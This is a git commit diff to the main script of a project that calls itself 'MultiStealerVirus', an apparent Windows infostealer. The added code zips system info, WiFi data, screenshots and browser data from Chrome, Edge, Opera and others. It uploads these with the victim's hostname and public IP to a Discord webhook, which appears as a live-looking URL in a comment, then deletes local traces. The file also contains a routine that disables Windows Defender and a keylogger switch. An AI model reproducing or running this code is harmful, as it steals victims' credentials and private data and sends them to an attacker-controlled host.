d1fbb7e9ebaf8f4947923b987aa02e03cb4985bd
Josakko <112590914+Josakko@users.noreply.github.com>
2023-04-28 23:25:00 +0200

    Update main.py

--- main.py
+++ main.py
@@ -7,6 +7,11 @@ from modules.startup import StartUp
 from tkinter import messagebox
 import zipfile
 import subprocess
+import discord
+from discord import File, SyncWebhook
+import socket
+import requests
+
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
@@ -15,14 +20,18 @@ def disable_defender():
         subprocess.run(["powershell", "-Command", cmd], capture_output=True)
     except:
         pass
+    
+#disable_defender()
 
 try:
     with open("todo.txt", "r") as f:
         lines = f.readlines()
-        keylogger = lines[5].strip()
-        Startup = lines[6].strip()
+        webhook = lines[0].strip()
+        keylogger = lines[1].strip()
+        Startup = lines[2]#.strip()
         f.close()
 except:
+    webhook = "null"
     Startup = "null"
     keylogger = "null"
 
@@ -66,7 +75,50 @@ def zip(name, files):
         pass
     
 zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png"])
-delete_files(["wifi.txt", "system.txt", "screenshot.png"])
+delete_files(["wifi.txt", "system.txt"]) #delete_files(["wifi.txt", "system.txt", "screenshot.png"])
+
+def send(url, files, text):
+    try:
+        webhook = SyncWebhook.from_url(url)#"https://discord.com/api/webhooks/1100106371451596821/67i4xd-mbGA0U1_krCys3hviIVmpw0eUqCplQVBaZHYbKw-sE9TovNbBvCYV_8ULyK1l"
+    except:
+        return
+
+    try:
+        ip = requests.get("https://api.ipify.org").text
+    except:
+        ip = "Unknown"
+
+    embed = discord.Embed(
+        title = text,
+        description = f"{text} for: {socket.gethostname()}, {ip}",
+        color = 0x10131c
+    )
+
+    file_dirs = files#["System.zip", "screenshot.png"]
+    files = []
+
+    for file in file_dirs:
+        try:
+            files.append(File(file))
+        except:
+            pass
+
+    embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
+    try:
+        webhook.send(embed=embed, files=files)
+    except:
+        pass
+
+try:
+    send(webhook, ["System.zip", "screenshot.png"], "System Info")
+    delete_files(["screenshot.png"])
+except:
+    pass
+
+try:
+    send(webhook, ["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"], "Browser Data")
+except:
+    pass
 
 if keylogger == "True":
     try:
